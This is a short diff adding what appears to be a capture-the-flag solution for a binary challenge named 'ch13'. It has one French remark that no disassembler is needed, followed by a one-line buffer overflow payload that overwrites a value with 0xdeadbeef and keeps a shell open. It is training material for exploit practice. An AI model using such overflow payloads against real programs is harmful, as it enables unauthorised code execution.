@@ -1,0 +1,2 @@
+Ici pas besoin de radare2, tout est dans le code source.
+(python -c "print('A'*40+'\xef\xbe\xad\xde')"; cat) | ./ch13
